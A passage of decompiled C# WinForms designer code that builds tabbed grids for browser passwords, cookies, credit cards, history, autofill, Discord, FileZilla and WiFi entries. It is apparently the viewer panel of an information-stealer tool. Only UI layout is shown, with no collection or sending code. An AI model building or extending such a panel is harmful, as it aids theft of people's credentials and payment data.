        this.RefreshListFileZilla = new System.Windows.Forms.ToolStripMenuItem();
        this.SaveFileZilla = new System.Windows.Forms.ToolStripMenuItem();
        this.PageWiFi = new System.Windows.Forms.TabPage();
        this.ListWifi = new Guna.UI2.WinForms.Guna2DataGridView();
        this.dataGridViewImageColumn9 = new System.Windows.Forms.DataGridViewImageColumn();
        this.dataGridViewTextBoxColumn24 = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.dataGridViewTextBoxColumn25 = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.dataGridViewTextBoxColumn26 = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.ContexListWifi = new System.Windows.Forms.ContextMenuStrip(this.components);
        this.RefreshListWifi = new System.Windows.Forms.ToolStripMenuItem();
        this.SaveWifi = new System.Windows.Forms.ToolStripMenuItem();
        this.PaneControll = new System.Windows.Forms.Panel();
        this.ButWifi = new Guna.UI2.WinForms.Guna2Button();
        this.ButDiscord = new Guna.UI2.WinForms.Guna2Button();
        this.ButMarket = new Guna.UI2.WinForms.Guna2Button();
        this.ButFileZaill = new Guna.UI2.WinForms.Guna2Button();
        this.ButHistory = new Guna.UI2.WinForms.Guna2Button();
        this.ButFiles = new Guna.UI2.WinForms.Guna2Button();
        this.ButCookies = new Guna.UI2.WinForms.Guna2Button();
        this.ButPass = new Guna.UI2.WinForms.Guna2Button();
        this.ButVisa = new Guna.UI2.WinForms.Guna2Button();
        this.PanelTitle = new Bunifu.UI.WinForms.BunifuPanel();
        this.ButtClose = new Guna.UI2.WinForms.Guna2CircleButton();
        this.ButtionMinimized = new Guna.UI2.WinForms.Guna2CircleButton();
        this.TitlrPage = new Bunifu.UI.WinForms.BunifuLabel();
        this.LoaderConnect = new Bunifu.UI.WinForms.BunifuLoader();
        this.UserIdInfo = new Bunifu.UI.WinForms.BunifuLabel();
        this.bunifuLabel1 = new Bunifu.UI.WinForms.BunifuLabel();
        this.ImageLogo = new System.Windows.Forms.PictureBox();
        this.PanelBottom = new Bunifu.UI.WinForms.BunifuPanel();
        this.PanelLeft = new Bunifu.UI.WinForms.BunifuPanel();
        this.PanelTOP = new Bunifu.UI.WinForms.BunifuPanel();
        this.PanelRight = new Bunifu.UI.WinForms.BunifuPanel();
        this.FormDragControl1 = new Bunifu.Framework.UI.BunifuDragControl(this.components);
        this.Timer1 = new System.Windows.Forms.Timer(this.components);
        this.TimerCounFile = new System.Windows.Forms.Timer(this.components);
        this.imageList1 = new System.Windows.Forms.ImageList(this.components);
        this.panelForm.SuspendLayout();
        this.PagePAS.SuspendLayout();
        this.PagePasswords.SuspendLayout();
        ((System.ComponentModel.ISupportInitialize)this.ListPasswords).BeginInit();
        this.ContexPasswords.SuspendLayout();
        this.PageCookies.SuspendLayout();
        ((System.ComponentModel.ISupportInitialize)this.ListCookies).BeginInit();
        this.PageCreditCards.SuspendLayout();
        ((System.ComponentModel.ISupportInitialize)this.ListCreditCards).BeginInit();
        this.PageHistory.SuspendLayout();
        ((System.ComponentModel.ISupportInitialize)this.ListHostiry).BeginInit();
        this.PageAutoFill.SuspendLayout();
        ((System.ComponentModel.ISupportInitialize)this.ListAutoFiles).BeginInit();
        this.PageBookmarks.SuspendLayout();
        ((System.ComponentModel.ISupportInitialize)this.ListMarket).BeginInit();
        this.PageDiscord.SuspendLayout();
        ((System.ComponentModel.ISupportInitialize)this.ListDiscord).BeginInit();
        this.ContexDiscord.SuspendLayout();
        this.PageFileZilla.SuspendLayout();
        ((System.ComponentModel.ISupportInitialize)this.ListFilezilla).BeginInit();
        this.ContexListFileZilla.SuspendLayout();
        this.PageWiFi.SuspendLayout();
        ((System.ComponentModel.ISupportInitialize)this.ListWifi).BeginInit();
        this.ContexListWifi.SuspendLayout();
        this.PaneControll.SuspendLayout();
        this.PanelTitle.SuspendLayout();
        ((System.ComponentModel.ISupportInitialize)this.ImageLogo).BeginInit();
        base.SuspendLayout();
        this.FormElipse.ElipseRadius = 4;
        this.FormElipse.TargetControl = this.panelForm;
        this.panelForm.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.panelForm.BackColor = System.Drawing.Color.White;
        this.panelForm.Controls.Add(this.PagePAS);
        this.panelForm.Controls.Add(this.PaneControll);
        this.panelForm.Controls.Add(this.PanelTitle);
        this.panelForm.Controls.Add(this.PanelBottom);
        this.panelForm.Controls.Add(this.PanelLeft);
        this.panelForm.Controls.Add(this.PanelTOP);
        this.panelForm.Controls.Add(this.PanelRight);
        this.panelForm.Location = new System.Drawing.Point(12, 12);
        this.panelForm.Name = "panelForm";
        this.panelForm.Size = new System.Drawing.Size(789, 531);
        this.panelForm.TabIndex = 575;
        this.panelForm.Visible = false;
        this.PagePAS.Alignment = System.Windows.Forms.TabAlignment.Bottom;
        this.PagePAS.AllowTransitions = false;
        this.PagePAS.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.PagePAS.Controls.Add(this.PagePasswords);
        this.PagePAS.Controls.Add(this.PageCookies);
        this.PagePAS.Controls.Add(this.PageCreditCards);
        this.PagePAS.Controls.Add(this.PageHistory);
        this.PagePAS.Controls.Add(this.PageAutoFill);
        this.PagePAS.Controls.Add(this.PageBookmarks);
        this.PagePAS.Controls.Add(this.PageDiscord);
        this.PagePAS.Controls.Add(this.PageFileZilla);
        this.PagePAS.Controls.Add(this.PageWiFi);
        this.PagePAS.Location = new System.Drawing.Point(67, 112);
        this.PagePAS.Multiline = true;
        this.PagePAS.Name = "PagePAS";
        this.PagePAS.Page = this.PageFileZilla;
        this.PagePAS.PageIndex = 7;
        this.PagePAS.PageName = "PageFileZilla";
        this.PagePAS.PageTitle = "FileZilla";
        this.PagePAS.SelectedIndex = 0;
        this.PagePAS.Size = new System.Drawing.Size(706, 405);
        this.PagePAS.TabIndex = 609;
        animation.AnimateOnlyDifferences = false;
        animation.BlindCoeff = (System.Drawing.PointF)resources.GetObject("animation1.BlindCoeff");
        animation.LeafCoeff = 0f;
        animation.MaxTime = 1f;
        animation.MinTime = 0f;
        animation.MosaicCoeff = (System.Drawing.PointF)resources.GetObject("animation1.MosaicCoeff");
        animation.MosaicShift = (System.Drawing.PointF)resources.GetObject("animation1.MosaicShift");
        animation.MosaicSize = 0;
        animation.Padding = new System.Windows.Forms.Padding(0);
        animation.RotateCoeff = 0f;
        animation.RotateLimit = 0f;
        animation.ScaleCoeff = (System.Drawing.PointF)resources.GetObject("animation1.ScaleCoeff");
        animation.SlideCoeff = (System.Drawing.PointF)resources.GetObject("animation1.SlideCoeff");
        animation.TimeCoeff = 0f;
        animation.TransparencyCoeff = 0f;
        this.PagePAS.Transition = animation;
        this.PagePAS.TransitionType = Utilities.BunifuPages.BunifuAnimatorNS.AnimationType.Custom;
        this.PagePasswords.Controls.Add(this.ListPasswords);
        this.PagePasswords.Location = new System.Drawing.Point(4, 4);
        this.PagePasswords.Name = "PagePasswords";
        this.PagePasswords.Size = new System.Drawing.Size(698, 379);
        this.PagePasswords.TabIndex = 0;
        this.PagePasswords.Text = "Passwords";
        this.PagePasswords.UseVisualStyleBackColor = true;
        this.ListPasswords.AllowUserToAddRows = false;
        this.ListPasswords.AllowUserToDeleteRows = false;
        this.ListPasswords.AllowUserToResizeColumns = false;
        this.ListPasswords.AllowUserToResizeRows = false;
        dataGridViewCellStyle.BackColor = System.Drawing.Color.FromArgb(247, 248, 249);
        this.ListPasswords.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle;
        this.ListPasswords.AutoSizeColumnsMode = System.Windows.Forms.DataGridViewAutoSizeColumnsMode.AllCells;
        this.ListPasswords.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
        this.ListPasswords.BackgroundColor = System.Drawing.Color.White;
        this.ListPasswords.BorderStyle = System.Windows.Forms.BorderStyle.None;
        this.ListPasswords.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.SingleHorizontal;
        this.ListPasswords.ClipboardCopyMode = System.Windows.Forms.DataGridViewClipboardCopyMode.Disable;
        this.ListPasswords.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
        dataGridViewCellStyle2.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
        dataGridViewCellStyle2.BackColor = System.Drawing.Color.FromArgb(232, 234, 237);
        dataGridViewCellStyle2.Font = new System.Drawing.Font("Segoe UI", 10.5f);
        dataGridViewCellStyle2.ForeColor = System.Drawing.Color.Black;
        dataGridViewCellStyle2.SelectionBackColor = System.Drawing.Color.FromArgb(232, 234, 237);
        dataGridViewCellStyle2.SelectionForeColor = System.Drawing.Color.Black;
        dataGridViewCellStyle2.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
        this.ListPasswords.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle2;
        this.ListPasswords.ColumnHeadersHeight = 30;
        this.ListPasswords.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
        this.ListPasswords.Columns.AddRange(this.dataGridViewImageColumn1, this.Column6, this.dataGridViewTextBoxColumn1, this.Column4, this.Column5);
        this.ListPasswords.ContextMenuStrip = this.ContexPasswords;
        dataGridViewCellStyle3.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
        dataGridViewCellStyle3.BackColor = System.Drawing.Color.White;
        dataGridViewCellStyle3.Font = new System.Drawing.Font("Segoe UI", 10.5f);
        dataGridViewCellStyle3.ForeColor = System.Drawing.Color.Black;
        dataGridViewCellStyle3.SelectionBackColor = System.Drawing.Color.FromArgb(87, 59, 255);
        dataGridViewCellStyle3.SelectionForeColor = System.Drawing.Color.White;
        dataGridViewCellStyle3.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
        this.ListPasswords.DefaultCellStyle = dataGridViewCellStyle3;
        this.ListPasswords.Dock = System.Windows.Forms.DockStyle.Fill;
        this.ListPasswords.EnableHeadersVisualStyles = false;
        this.ListPasswords.GridColor = System.Drawing.Color.FromArgb(244, 245, 247);
        this.ListPasswords.Location = new System.Drawing.Point(0, 0);
        this.ListPasswords.Name = "ListPasswords";
        this.ListPasswords.ReadOnly = true;
        this.ListPasswords.RowHeadersVisible = false;
        this.ListPasswords.RowHeadersWidth = 27;
        this.ListPasswords.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
        this.ListPasswords.ShowCellErrors = false;
        this.ListPasswords.ShowEditingIcon = false;
        this.ListPasswords.ShowRowErrors = false;
        this.ListPasswords.Size = new System.Drawing.Size(698, 379);
        this.ListPasswords.TabIndex = 660;
        this.ListPasswords.Theme = Guna.UI2.WinForms.Enums.DataGridViewPresetThemes.Light;
        this.ListPasswords.ThemeStyle.AlternatingRowsStyle.BackColor = System.Drawing.Color.FromArgb(247, 248, 249);
        this.ListPasswords.ThemeStyle.AlternatingRowsStyle.Font = null;
        this.ListPasswords.ThemeStyle.AlternatingRowsStyle.ForeColor = System.Drawing.Color.Empty;
        this.ListPasswords.ThemeStyle.AlternatingRowsStyle.SelectionBackColor = System.Drawing.Color.Empty;
        this.ListPasswords.ThemeStyle.AlternatingRowsStyle.SelectionForeColor = System.Drawing.Color.Empty;
        this.ListPasswords.ThemeStyle.BackColor = System.Drawing.Color.White;
        this.ListPasswords.ThemeStyle.GridColor = System.Drawing.Color.FromArgb(244, 245, 247);
        this.ListPasswords.ThemeStyle.HeaderStyle.BackColor = System.Drawing.Color.FromArgb(232, 234, 237);
        this.ListPasswords.ThemeStyle.HeaderStyle.BorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
        this.ListPasswords.ThemeStyle.HeaderStyle.Font = new System.Drawing.Font("Segoe UI", 10.5f);
        this.ListPasswords.ThemeStyle.HeaderStyle.ForeColor = System.Drawing.Color.Black;
        this.ListPasswords.ThemeStyle.HeaderStyle.HeaightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
        this.ListPasswords.ThemeStyle.HeaderStyle.Height = 30;
        this.ListPasswords.ThemeStyle.ReadOnly = true;
        this.ListPasswords.ThemeStyle.RowsStyle.BackColor = System.Drawing.Color.White;
        this.ListPasswords.ThemeStyle.RowsStyle.BorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.SingleHorizontal;
        this.ListPasswords.ThemeStyle.RowsStyle.Font = new System.Drawing.Font("Segoe UI", 10.5f);
        this.ListPasswords.ThemeStyle.RowsStyle.ForeColor = System.Drawing.Color.Black;
        this.ListPasswords.ThemeStyle.RowsStyle.Height = 22;
        this.ListPasswords.ThemeStyle.RowsStyle.SelectionBackColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.ListPasswords.ThemeStyle.RowsStyle.SelectionForeColor = System.Drawing.Color.White;
        this.dataGridViewImageColumn1.HeaderText = "";
        this.dataGridViewImageColumn1.Name = "dataGridViewImageColumn1";
        this.dataGridViewImageColumn1.ReadOnly = true;
        this.dataGridViewImageColumn1.Width = 5;
        this.Column6.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
        this.Column6.HeaderText = "Browser";
        this.Column6.Name = "Column6";
        this.Column6.ReadOnly = true;
        this.Column6.Width = 81;
        this.dataGridViewTextBoxColumn1.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
        dataGridViewCellStyle4.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
        this.dataGridViewTextBoxColumn1.DefaultCellStyle = dataGridViewCellStyle4;
        this.dataGridViewTextBoxColumn1.HeaderText = "Username";
        this.dataGridViewTextBoxColumn1.Name = "dataGridViewTextBoxColumn1";
        this.dataGridViewTextBoxColumn1.ReadOnly = true;
        this.dataGridViewTextBoxColumn1.Width = 94;
        this.Column4.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
        this.Column4.HeaderText = "Password";
        this.Column4.Name = "Column4";
        this.Column4.ReadOnly = true;
        this.Column4.Width = 90;
        this.Column5.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
        this.Column5.HeaderText = "URL";
        this.Column5.Name = "Column5";
        this.Column5.ReadOnly = true;
        this.Column5.Width = 57;
        this.ContexPasswords.ImageScalingSize = new System.Drawing.Size(20, 20);
        this.ContexPasswords.Items.AddRange(new System.Windows.Forms.ToolStripItem[3] { this.RefrshListPassword, this.Editor, this.SavePass });
        this.ContexPasswords.Name = "contextMenuStrip1";
        this.ContexPasswords.Size = new System.Drawing.Size(118, 82);
        this.RefrshListPassword.BackColor = System.Drawing.Color.White;
        this.RefrshListPassword.Image = (System.Drawing.Image)resources.GetObject("RefrshListPassword.Image");
        this.RefrshListPassword.Name = "RefrshListPassword";
        this.RefrshListPassword.Size = new System.Drawing.Size(117, 26);
        this.RefrshListPassword.Text = "Refresh";
        this.RefrshListPassword.Click += new System.EventHandler(RefrshListPassword_Click);
        this.Editor.BackColor = System.Drawing.Color.White;
        this.Editor.Image = (System.Drawing.Image)resources.GetObject("Editor.Image");
        this.Editor.Name = "Editor";
        this.Editor.Size = new System.Drawing.Size(117, 26);
        this.Editor.Text = "Editor";
        this.Editor.Click += new System.EventHandler(Editor_Click);
        this.SavePass.BackColor = System.Drawing.Color.White;
        this.SavePass.Image = (System.Drawing.Image)resources.GetObject("SavePass.Image");
        this.SavePass.Name = "SavePass";
        this.SavePass.Size = new System.Drawing.Size(117, 26);
        this.SavePass.Text = "Save";
        this.SavePass.Click += new System.EventHandler(SavePass_Click);
        this.PageCookies.Controls.Add(this.ListCookies);
        this.PageCookies.Location = new System.Drawing.Point(4, 4);
        this.PageCookies.Name = "PageCookies";
        this.PageCookies.Size = new System.Drawing.Size(698, 379);
        this.PageCookies.TabIndex = 1;
        this.PageCookies.Text = "Cookies";
        this.PageCookies.UseVisualStyleBackColor = true;
        this.ListCookies.AllowUserToAddRows = false;
        this.ListCookies.AllowUserToDeleteRows = false;
        this.ListCookies.AllowUserToResizeColumns = false;
        this.ListCookies.AllowUserToResizeRows = false;
        dataGridViewCellStyle5.BackColor = System.Drawing.Color.FromArgb(247, 248, 249);
        this.ListCookies.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle5;
        this.ListCookies.AutoSizeColumnsMode = System.Windows.Forms.DataGridViewAutoSizeColumnsMode.AllCells;
        this.ListCookies.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
        this.ListCookies.BackgroundColor = System.Drawing.Color.White;
        this.ListCookies.BorderStyle = System.Windows.Forms.BorderStyle.None;
        this.ListCookies.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.SingleHorizontal;
        this.ListCookies.ClipboardCopyMode = System.Windows.Forms.DataGridViewClipboardCopyMode.Disable;
        this.ListCookies.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
        dataGridViewCellStyle6.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
        dataGridViewCellStyle6.BackColor = System.Drawing.Color.FromArgb(232, 234, 237);
        dataGridViewCellStyle6.Font = new System.Drawing.Font("Segoe UI", 10.5f);
        dataGridViewCellStyle6.ForeColor = System.Drawing.Color.Black;
        dataGridViewCellStyle6.SelectionBackColor = System.Drawing.Color.FromArgb(232, 234, 237);
        dataGridViewCellStyle6.SelectionForeColor = System.Drawing.Color.Black;
        dataGridViewCellStyle6.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
        this.ListCookies.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle6;
        this.ListCookies.ColumnHeadersHeight = 30;
        this.ListCookies.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
        this.ListCookies.Columns.AddRange(this.dataGridViewImageColumn2, this.dataGridViewTextBoxColumn2, this.dataGridViewTextBoxColumn3, this.dataGridViewTextBoxColumn4, this.dataGridViewTextBoxColumn5, this.Column1, this.Column2, this.Column3, this.Column7);
        this.ListCookies.ContextMenuStrip = this.ContexPasswords;
        dataGridViewCellStyle7.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
        dataGridViewCellStyle7.BackColor = System.Drawing.Color.White;
        dataGridViewCellStyle7.Font = new System.Drawing.Font("Segoe UI", 10.5f);
        dataGridViewCellStyle7.ForeColor = System.Drawing.Color.Black;
        dataGridViewCellStyle7.SelectionBackColor = System.Drawing.Color.FromArgb(87, 59, 255);
        dataGridViewCellStyle7.SelectionForeColor = System.Drawing.Color.White;
        dataGridViewCellStyle7.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
        this.ListCookies.DefaultCellStyle = dataGridViewCellStyle7;
        this.ListCookies.Dock = System.Windows.Forms.DockStyle.Fill;
        this.ListCookies.EnableHeadersVisualStyles = false;
        this.ListCookies.GridColor = System.Drawing.Color.FromArgb(244, 245, 247);
        this.ListCookies.Location = new System.Drawing.Point(0, 0);
        this.ListCookies.Name = "ListCookies";
        this.ListCookies.ReadOnly = true;
        this.ListCookies.RowHeadersVisible = false;
        this.ListCookies.RowHeadersWidth = 27;
        this.ListCookies.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
        this.ListCookies.ShowCellErrors = false;
        this.ListCookies.ShowEditingIcon = false;
        this.ListCookies.ShowRowErrors = false;
        this.ListCookies.Size = new System.Drawing.Size(698, 379);
        this.ListCookies.TabIndex = 661;
        this.ListCookies.Theme = Guna.UI2.WinForms.Enums.DataGridViewPresetThemes.Light;
        this.ListCookies.ThemeStyle.AlternatingRowsStyle.BackColor = System.Drawing.Color.FromArgb(247, 248, 249);
        this.ListCookies.ThemeStyle.AlternatingRowsStyle.Font = null;
        this.ListCookies.ThemeStyle.AlternatingRowsStyle.ForeColor = System.Drawing.Color.Empty;
        this.ListCookies.ThemeStyle.AlternatingRowsStyle.SelectionBackColor = System.Drawing.Color.Empty;
        this.ListCookies.ThemeStyle.AlternatingRowsStyle.SelectionForeColor = System.Drawing.Color.Empty;
        this.ListCookies.ThemeStyle.BackColor = System.Drawing.Color.White;
        this.ListCookies.ThemeStyle.GridColor = System.Drawing.Color.FromArgb(244, 245, 247);
        this.ListCookies.ThemeStyle.HeaderStyle.BackColor = System.Drawing.Color.FromArgb(232, 234, 237);
        this.ListCookies.ThemeStyle.HeaderStyle.BorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
        this.ListCookies.ThemeStyle.HeaderStyle.Font = new System.Drawing.Font("Segoe UI", 10.5f);
        this.ListCookies.ThemeStyle.HeaderStyle.ForeColor = System.Drawing.Color.Black;
        this.ListCookies.ThemeStyle.HeaderStyle.HeaightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
        this.ListCookies.ThemeStyle.HeaderStyle.Height = 30;
        this.ListCookies.ThemeStyle.ReadOnly = true;
        this.ListCookies.ThemeStyle.RowsStyle.BackColor = System.Drawing.Color.White;
        this.ListCookies.ThemeStyle.RowsStyle.BorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.SingleHorizontal;
        this.ListCookies.ThemeStyle.RowsStyle.Font = new System.Drawing.Font("Segoe UI", 10.5f);
        this.ListCookies.ThemeStyle.RowsStyle.ForeColor = System.Drawing.Color.Black;
        this.ListCookies.ThemeStyle.RowsStyle.Height = 22;
        this.ListCookies.ThemeStyle.RowsStyle.SelectionBackColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.ListCookies.ThemeStyle.RowsStyle.SelectionForeColor = System.Drawing.Color.White;
        this.dataGridViewImageColumn2.HeaderText = "";
        this.dataGridViewImageColumn2.Name = "dataGridViewImageColumn2";
        this.dataGridViewImageColumn2.ReadOnly = true;
        this.dataGridViewImageColumn2.Width = 5;
        this.dataGridViewTextBoxColumn2.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
        this.dataGridViewTextBoxColumn2.HeaderText = "Browser";
        this.dataGridViewTextBoxColumn2.Name = "dataGridViewTextBoxColumn2";
        this.dataGridViewTextBoxColumn2.ReadOnly = true;
        this.dataGridViewTextBoxColumn2.Width = 81;
        this.dataGridViewTextBoxColumn3.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
        dataGridViewCellStyle8.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
        this.dataGridViewTextBoxColumn3.DefaultCellStyle = dataGridViewCellStyle8;
        this.dataGridViewTextBoxColumn3.HeaderText = "Name";
        this.dataGridViewTextBoxColumn3.Name = "dataGridViewTextBoxColumn3";
        this.dataGridViewTextBoxColumn3.ReadOnly = true;
        this.dataGridViewTextBoxColumn3.Width = 68;
        this.dataGridViewTextBoxColumn4.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
        this.dataGridViewTextBoxColumn4.HeaderText = "Key";
        this.dataGridViewTextBoxColumn4.Name = "dataGridViewTextBoxColumn4";
        this.dataGridViewTextBoxColumn4.ReadOnly = true;
        this.dataGridViewTextBoxColumn4.Width = 54;
        this.dataGridViewTextBoxColumn5.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
        this.dataGridViewTextBoxColumn5.HeaderText = "Secure";
        this.dataGridViewTextBoxColumn5.Name = "dataGridViewTextBoxColumn5";
        this.dataGridViewTextBoxColumn5.ReadOnly = true;
        this.dataGridViewTextBoxColumn5.Width = 72;
        this.Column1.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
        this.Column1.HeaderText = "Host Key";
        this.Column1.Name = "Column1";
        this.Column1.ReadOnly = true;
        this.Column1.Width = 87;
        this.Column2.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
        this.Column2.HeaderText = "Expires";
        this.Column2.Name = "Column2";
        this.Column2.ReadOnly = true;
        this.Column2.Width = 74;
        this.Column3.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
        this.Column3.HeaderText = "Value";
        this.Column3.Name = "Column3";
        this.Column3.ReadOnly = true;
        this.Column3.Width = 65;
        this.Column7.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
        this.Column7.HeaderText = "Path";
        this.Column7.Name = "Column7";
        this.Column7.ReadOnly = true;
        this.Column7.Width = 60;
        this.PageCreditCards.Controls.Add(this.ListCreditCards);
        this.PageCreditCards.Location = new System.Drawing.Point(4, 4);
        this.PageCreditCards.Name = "PageCreditCards";
        this.PageCreditCards.Size = new System.Drawing.Size(698, 379);
        this.PageCreditCards.TabIndex = 2;
        this.PageCreditCards.Text = "CreditCards";
        this.PageCreditCards.UseVisualStyleBackColor = true;
        this.ListCreditCards.AllowUserToAddRows = false;
        this.ListCreditCards.AllowUserToDeleteRows = false;
        this.ListCreditCards.AllowUserToResizeColumns = false;
        this.ListCreditCards.AllowUserToResizeRows = false;
        dataGridViewCellStyle9.BackColor = System.Drawing.Color.FromArgb(247, 248, 249);
        this.ListCreditCards.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle9;
        this.ListCreditCards.AutoSizeColumnsMode = System.Windows.Forms.DataGridViewAutoSizeColumnsMode.AllCells;
        this.ListCreditCards.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
        this.ListCreditCards.BackgroundColor = System.Drawing.Color.White;
        this.ListCreditCards.BorderStyle = System.Windows.Forms.BorderStyle.None;
        this.ListCreditCards.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.SingleHorizontal;
        this.ListCreditCards.ClipboardCopyMode = System.Windows.Forms.DataGridViewClipboardCopyMode.Disable;
        this.ListCreditCards.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
        dataGridViewCellStyle10.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
        dataGridViewCellStyle10.BackColor = System.Drawing.Color.FromArgb(232, 234, 237);
        dataGridViewCellStyle10.Font = new System.Drawing.Font("Segoe UI", 10.5f);
        dataGridViewCellStyle10.ForeColor = System.Drawing.Color.Black;
        dataGridViewCellStyle10.SelectionBackColor = System.Drawing.Color.FromArgb(232, 234, 237);
        dataGridViewCellStyle10.SelectionForeColor = System.Drawing.Color.Black;
        dataGridViewCellStyle10.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
        this.ListCreditCards.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle10;
        this.ListCreditCards.ColumnHeadersHeight = 30;
        this.ListCreditCards.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
        this.ListCreditCards.Columns.AddRange(this.dataGridViewImageColumn3, this.dataGridViewTextBoxColumn6, this.dataGridViewTextBoxColumn7, this.dataGridViewTextBoxColumn8, this.dataGridViewTextBoxColumn9, this.dataGridViewTextBoxColumn10);
        this.ListCreditCards.ContextMenuStrip = this.ContexPasswords;
        dataGridViewCellStyle11.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
        dataGridViewCellStyle11.BackColor = System.Drawing.Color.White;
        dataGridViewCellStyle11.Font = new System.Drawing.Font("Segoe UI", 10.5f);
        dataGridViewCellStyle11.ForeColor = System.Drawing.Color.Black;
        dataGridViewCellStyle11.SelectionBackColor = System.Drawing.Color.FromArgb(87, 59, 255);
        dataGridViewCellStyle11.SelectionForeColor = System.Drawing.Color.White;
        dataGridViewCellStyle11.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
        this.ListCreditCards.DefaultCellStyle = dataGridViewCellStyle11;
        this.ListCreditCards.Dock = System.Windows.Forms.DockStyle.Fill;
        this.ListCreditCards.EnableHeadersVisualStyles = false;
        this.ListCreditCards.GridColor = System.Drawing.Color.FromArgb(244, 245, 247);
        this.ListCreditCards.Location = new System.Drawing.Point(0, 0);
        this.ListCreditCards.Name = "ListCreditCards";
        this.ListCreditCards.ReadOnly = true;
        this.ListCreditCards.RowHeadersVisible = false;
        this.ListCreditCards.RowHeadersWidth = 27;
        this.ListCreditCards.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
        this.ListCreditCards.ShowCellErrors = false;
        this.ListCreditCards.ShowEditingIcon = false;
        this.ListCreditCards.ShowRowErrors = false;
        this.ListCreditCards.Size = new System.Drawing.Size(698, 379);
        this.ListCreditCards.TabIndex = 662;
        this.ListCreditCards.Theme = Guna.UI2.WinForms.Enums.DataGridViewPresetThemes.Light;
        this.ListCreditCards.ThemeStyle.AlternatingRowsStyle.BackColor = System.Drawing.Color.FromArgb(247, 248, 249);
        this.ListCreditCards.ThemeStyle.AlternatingRowsStyle.Font = null;
        this.ListCreditCards.ThemeStyle.AlternatingRowsStyle.ForeColor = System.Drawing.Color.Empty;
        this.ListCreditCards.ThemeStyle.AlternatingRowsStyle.SelectionBackColor = System.Drawing.Color.Empty;
        this.ListCreditCards.ThemeStyle.AlternatingRowsStyle.SelectionForeColor = System.Drawing.Color.Empty;
        this.ListCreditCards.ThemeStyle.BackColor = System.Drawing.Color.White;
        this.ListCreditCards.ThemeStyle.GridColor = System.Drawing.Color.FromArgb(244, 245, 247);
        this.ListCreditCards.ThemeStyle.HeaderStyle.BackColor = System.Drawing.Color.FromArgb(232, 234, 237);
        this.ListCreditCards.ThemeStyle.HeaderStyle.BorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
